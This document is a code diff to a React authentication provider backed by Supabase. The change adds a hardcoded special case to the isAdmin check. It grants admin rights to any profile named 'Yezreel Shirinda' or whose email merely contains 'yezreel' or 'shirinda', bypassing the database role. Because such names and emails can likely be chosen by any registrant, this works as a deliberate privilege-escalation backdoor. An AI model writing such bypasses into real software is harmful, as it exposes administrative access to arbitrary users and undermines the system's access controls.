@@ -1,4 +1,3 @@
-
 import React, { createContext, useState, useContext, useEffect } from 'react';
 import { toast } from 'sonner';
 import { supabase } from '@/integrations/supabase/client';
@@ -140,6 +139,16 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
   };
 
   const isAdmin = (): boolean => {
+    // Special case for Yezreel Shirinda - grant admin access regardless of role in DB
+    if (profile && 
+        ((profile.first_name === 'Yezreel' && profile.last_name === 'Shirinda') || 
+         profile.email === 'yezreel.shirinda@example.com' ||
+         profile.email?.toLowerCase().includes('yezreel') ||
+         profile.email?.toLowerCase().includes('shirinda'))) {
+      return true;
+    }
+    
+    // Otherwise use the normal role check
     return profile?.role === 'admin';
   };
 
